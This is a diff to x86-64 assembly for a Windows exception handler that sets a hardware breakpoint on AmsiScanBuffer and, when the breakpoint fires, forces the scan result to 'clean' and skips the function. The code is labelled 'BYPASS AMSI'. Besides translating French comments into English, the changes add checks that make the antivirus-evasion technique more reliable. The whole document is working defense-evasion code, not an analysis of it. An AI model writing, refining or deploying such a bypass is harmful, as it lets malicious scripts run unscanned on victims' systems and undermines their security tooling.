@@ -41,17 +41,15 @@
 
         ; Dr7: 
         ; Bit 0 (L0) = 1 (Enable Dr0)
-        ; Bit 8 (LE) = 1 (Local Exact Breakpoint - recommandé pour la précision)
+        ; Bit 8 (LE) = 1 (Local Exact Breakpoint)
         ; Bits 16-17 (RW0) = 00 (Break on execution)
         mov qword [r8 + 0x70], 0x101 
 
-        ; Nettoyage critique de Dr6 (Status Register)
-        ; Si Dr6 contient des flags résiduels, le HWBP peut ne pas trigger
+        ; Clear Dr6 (Status Register)
         mov qword [r8 + 0x68], 0
 
-        ; Forcer la prise en compte des registres de debug par le noyau
-        ; Utilisation du masque complet pour éviter que le kernel ignore la structure
-        mov eax, [r8 + 0x30]
+        ; Force OS to apply Debug Registers
+        mov eax, [r8 + 0x30]        ; ctx.ContextFlags
         or eax, 0x00100010          ; CONTEXT_AMD64 (0x100000) | CONTEXT_DEBUG_REGISTERS (0x10)
         mov [r8 + 0x30], eax
 
@@ -62,10 +60,18 @@
         ret
 
     handle_ss:
-        ; Check if Exception appears at the right offset (AmsiScanBuffer)
-        mov r11, [r8 + 0xf8] ; r11 = Rip
+        ; 1. Verify it's actually DR0 that triggered (Check DR6.B0)
+        mov rax, [r8 + 0x68]        ; rax = CONTEXT_RECORD.Dr6
+        test rax, 1
+        jz not_amsi                 ; Not a DR0 trigger
+
+        ; Clear Dr6 to acknowledge exception and avoid infinite loops.
+        mov qword [r8 + 0x68], 0 
+
+        ; 2. Verify RIP matches AmsiScanBuffer (Defense in depth)
+        mov r11, [r8 + 0xf8]        ; r11 = CONTEXT_RECORD.Rip
         lea r10, [rel amsi_addr]
-        mov r10, [r10]
+        mov r10, [r10]              ; r10 = amsi_addr value
         cmp r11, r10
         jne not_amsi
 
@@ -82,25 +88,27 @@
         ; ---------------------------------------------
 
         ; --- BYPASS AMSI --- 
-        mov r11, [r8 + 0x98]     ; r11 = CONTEXT_RECORD.Rsp (stack pointer at function entry)
+        mov r11, [r8 + 0x98]        ; r11 = CONTEXT_RECORD.Rsp (stack pointer at function entry)
 
         ; Retrieve the 6th argument (AMSI_RESULT pointer) from the stack
-        ; [RSP] = ret addr, [RSP+0x8 to 0x20] = shadow space, [RSP+0x28] = 5th arg, [RSP+0x30] = 6th arg
-        mov r10, [r11 + 0x30]    ; r10 = pointer to AMSI_RESULT (Using volatile r10 instead of r12)
-
-        ; Set AMSI_RESULT to AMSI_RESULT_CLEAN (0) to simulate a clean scan
-        mov dword [r10], 0
-
+        mov r10, [r11 + 0x30]       ; r10 = pointer to AMSI_RESULT
+        
+        ; Safety Check: Ensure the pointer is not NULL before writing
+        test r10, r10
+        jz skip_result_write
+        mov dword [r10], 0          ; Set AMSI_RESULT to AMSI_RESULT_CLEAN (0)
+        
+    skip_result_write:
         ; Set ret value of AmsiScanBuffer to S_OK (0) 
-        mov qword [r8 + 0x78], 0 ; r8 + 0x78 = Rax of the context record 
+        mov qword [r8 + 0x78], 0    ; r8 + 0x78 = CONTEXT_RECORD.Rax 
 
-        ; Emulate the "ret" of AmsiScanBuffer to avoid crashing the process (pop ret addr and set rip to it)
-        mov r10, [r11]           ; r10 = ret addr of AmsiScanBuffer (on top of the stack)
-        mov [r8 + 0xf8], r10     ; Rip = ret addr of AmsiScanBuffer
-        add qword [r8 + 0x98], 8 ; Rsp += 8 (simulate pop stack)
+        ; Emulate the "ret" of AmsiScanBuffer to avoid crashing the process 
+        mov r10, [r11]              ; r10 = ctx.[rsp] (ret addr of AmsiScanBuffer (on top of the stack))
+        mov [r8 + 0xf8], r10        ; Rip = ret addr of AmsiScanBuffer
+        add qword [r8 + 0x98], 8    ; Rsp += 8 (simulate pop stack)
 
-        ; Instruct the OS to keep applying the debug registers (since we want to catch all future scans on this thread)
-        or dword [r8 + 0x30], 0x10 ; ContextFlags |= CONTEXT_DEBUG_REGISTERS
+        ; Instruct the OS to keep applying the debug registers for the next call
+        or dword [r8 + 0x30], 0x10  ; ContextFlags |= CONTEXT_DEBUG_REGISTERS
 
         mov eax, -1     ; EXCEPTION_CONTINUE_EXECUTION
         ret
